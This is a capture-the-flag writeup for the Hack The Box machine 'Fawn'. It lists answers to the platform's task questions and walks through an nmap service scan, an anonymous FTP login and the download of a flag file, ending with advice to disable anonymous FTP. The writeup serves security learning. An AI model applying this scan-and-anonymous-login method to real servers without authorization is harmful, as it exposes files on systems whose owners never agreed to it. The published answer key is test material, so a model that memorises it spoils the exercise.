---
title: "Hack The Box — Starting Point: Fawn Writeup"
date: 2026-03-12 00:00:00 +0800
categories: [CTF, HTB-StartingPoint]
tags: [htb, starting-point, ftp, nmap, openvpn, linux]
image:
  path: /assets/img/fawn-badge.jpeg
  alt: Hack The Box Fawn
description: Writeup for Hack The Box Starting Point — Fawn. Covers VPN setup, Nmap scanning, and exploiting a misconfigured FTP service with anonymous login enabled.
---

---

## Overview

This machine focuses on **FTP (File Transfer Protocol)** enumeration and exploitation of a misconfigured FTP service that allows unauthenticated anonymous access. The objective is to retrieve the `flag.txt` file from the target system.

---

## Task Questions & Answers

**Task 1: What does the 3-letter acronym FTP stand for?**  
`File Transfer Protocol`

**Task 2: Which port does the FTP service listen on usually?**  
`21`

**Task 3: FTP sends data in the clear, without any encryption. What acronym is used for a later protocol designed to provide similar functionality to FTP but securely, as an extension of the SSH protocol?**  
`SFTP`

**Task 4: What is the command we can use to send an ICMP echo request to test our connection to the target?**  
`ping`

**Task 5: From your scans, what version is FTP running on the target?**
`vsftpd 3.0.3`

**Task 6: From your scans, what OS type is running on the target?**
`Unix`

**Task 7: What is the command we need to run in order to display the 'ftp' client help menu?**  
`ftp -?`

**Task 8: What is the username that is used over FTP when you want to log in without having an account?**  
`anonymous`

**Task 9: What is the response code we get for the FTP message 'Login successful'?**  
`230`

**Task 10: There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system?**  
`ls`

**Task 11: What is the command used to download the file we found on the FTP server?**  
`get`

---

## Walkthrough

### Step 1 — Connect to the VPN and Start the Machine

Before accessing the target, establish a connection to the HTB network via OpenVPN:

```bash
sudo openvpn ~/Downloads/starting_point_eu-starting-point-2-dhcp.ovpn
```

Allow the VPN tunnel to establish fully, then open a new terminal tab to proceed.

![OpenVPN connected](/assets/img/fawn-1.jpeg)
![OpenVPN connected](/assets/img/fawn-2.jpeg)

---

### Step 2 — Verify Connectivity

Confirm the target is reachable by sending ICMP echo requests:

```bash
ping <target_ip>
```

A successful reply after a few packets confirms network connectivity to the target host.

![Ping output](/assets/img/fawn-3.jpeg)

---

### Step 3 — Enumerate Open Ports with Nmap

Perform a service version scan to identify open ports and the software running on them:

```bash
nmap -sV <target_ip>
```

**Sample output:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```

Port **21** is open, running **vsftpd 3.0.3** — a common FTP server daemon on Linux systems. The `-sV` flag instructs Nmap to probe open ports and determine the service version.

![Nmap scan result](/assets/img/fawn-4.jpeg)

---

### Step 4 — Connect via FTP (Anonymous Login)

FTP supports a feature called **anonymous login**, which allows users to authenticate without a registered account by using `anonymous` as the username. This is a common misconfiguration that can expose sensitive files.

Connect to the target using the anonymous account:

```bash
ftp anonymous@<target_ip>
```

When prompted for a password, simply press **Enter** — no password is required.

**Expected output:**

```
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
```

Response code **230** confirms a successful login.

![FTP login](/assets/img/fawn-5.jpeg)

---

### Step 5 — Enumerate and Retrieve the Flag

Once inside the FTP shell, list the available files:

```bash
ls
```

**Output:**

```
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

The `flag.txt` file is present. Download it to the local machine using the `get` command:

```bash
get flag.txt
```

Exit the FTP session:

```bash
exit
```

---

### Step 6 — Read the Flag

Back in the local terminal, display the flag contents by using this command:

```bash
cat flag.txt
```

The flag value will be printed to the terminal. 

![Flag captured](/assets/img/fawn-5.jpeg)

---

## Summary

| Step | Action | Command |
|------|--------|---------|
| 1 | Connect to VPN | `sudo openvpn <config>.ovpn` |
| 2 | Verify connectivity | `ping <target_ip>` |
| 3 | Enumerate services | `nmap -sV <target_ip>` |
| 4 | Authenticate via FTP | `ftp anonymous@<target_ip>` |
| 5 | List & download flag | `ls` → `get flag.txt` |
| 6 | Read the flag | `cat flag.txt` |

**Key Takeaway:** Anonymous FTP access is a critical misconfiguration that grants unauthenticated users read (and sometimes write) access to the server's file system. Always disable anonymous login on production FTP servers, or better yet, replace FTP with **SFTP** for encrypted file transfers.
